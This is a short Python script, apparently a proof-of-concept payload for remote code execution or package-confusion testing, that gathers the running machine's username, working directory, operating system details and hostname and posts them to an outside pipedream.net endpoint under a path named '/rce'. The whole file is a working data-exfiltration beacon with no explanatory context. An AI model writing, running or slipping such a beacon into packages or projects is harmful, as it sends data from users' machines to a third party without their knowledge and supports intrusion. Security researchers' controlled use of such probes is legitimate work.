import os
import platform
import getpass
import socket
import requests
import json

YOUR_SERVER_URL = "https://eoo6ltadscxvgto.m.pipedream.net/rce"

def collect_info():
    info = {
        "username": getpass.getuser(),
        "cwd": os.getcwd(),
        "os_name": platform.system(),
        "os_version": platform.version(),
        "platform": platform.platform(),
        "hostname": socket.gethostname()
    }
    return info

def send_to_server(data):
    try:
        response = requests.post(YOUR_SERVER_URL, json=data, timeout=5)
        print(f"Sent! Server responded with: {response.status_code}")
    except Exception as e:
        print(f"Failed to send data: {e}")

if __name__ == "__main__":
    info = collect_info()
    send_to_server(info)
